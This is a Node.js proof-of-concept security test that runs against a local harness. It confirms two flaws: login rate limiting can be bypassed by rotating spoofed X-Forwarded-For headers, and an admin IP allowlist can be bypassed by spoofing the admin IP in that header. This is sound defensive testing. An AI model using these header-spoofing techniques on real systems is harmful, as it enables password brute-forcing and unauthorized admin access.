// SEC-01 PoCs against the default configuration (TRUST_PROXY unset). Run from the repo root:
//   node security-tests/trust-proxy-poc.mjs
// Local only: own API on 127.0.0.1:5055 with an in-memory database (see harness.mjs).
import { ADMIN_IP, startHarness } from './harness.mjs';

const h = await startHarness({ trustProxy: false });
const { users, request } = h;
const record = (id, title, confirmed, evidence) => console.log(`${confirmed ? 'CONFIRMED' : 'NOT REPRODUCED'}  ${id}  ${title}
    ${evidence}`);
const run = async (id, title, fn) => {
  try {
    await fn((confirmed, evidence) => record(id, title, confirmed, evidence));
  } catch (err) {
    record(id, title, false, `error: ${err.message}`);
  }
};

// SEC-01: X-Forwarded-For is trusted from any client -> login rate limit bypass.
await run('SEC-01', 'Auth rate limit bypass by rotating X-Forwarded-For', async (done) => {
  const fixed = [];
  for (let i = 0; i < 12; i++) {
    const r = await request('POST', '/login', { body: { email: users.alice.email, password: 'Wrong-pass-1' }, headers: { 'X-Forwarded-For': '192.0.2.10' } });
    fixed.push(r.status);
  }
  const rotated = [];
  for (let i = 0; i < 40; i++) {
    const r = await request('POST', '/login', { body: { email: users.alice.email, password: 'Wrong-pass-1' }, headers: { 'X-Forwarded-For': `192.0.2.${100 + i}` } });
    rotated.push(r.status);
  }
  const fixedLimited = fixed.includes(429);
  const rotatedLimited = rotated.includes(429);
  done(fixedLimited && !rotatedLimited, `same XFF: ${fixed.filter((s) => s === 429).length}/12 got 429; rotating XFF: 40 attempts, ${rotated.filter((s) => s === 429).length} got 429 (all ${[...new Set(rotated)].join(',')})`);
});

// SEC-01b: the admin IP allowlist is decided by the same spoofable req.ip.
await run('SEC-01b', 'ADMIN_IP_ALLOWLIST bypass via X-Forwarded-For', async (done) => {
  const denied = await request('GET', '/coupons', { token: users.admin.token, headers: { 'X-Forwarded-For': '192.0.2.55' } });
  const allowed = await request('GET', '/coupons', { token: users.admin.token, headers: { 'X-Forwarded-For': ADMIN_IP } });
  done(denied.status === 403 && allowed.status === 200, `allowlist=${ADMIN_IP}; other XFF -> ${denied.status}, spoofed XFF ${ADMIN_IP} -> ${allowed.status}`);
});

await h.stop();
process.exit(0);
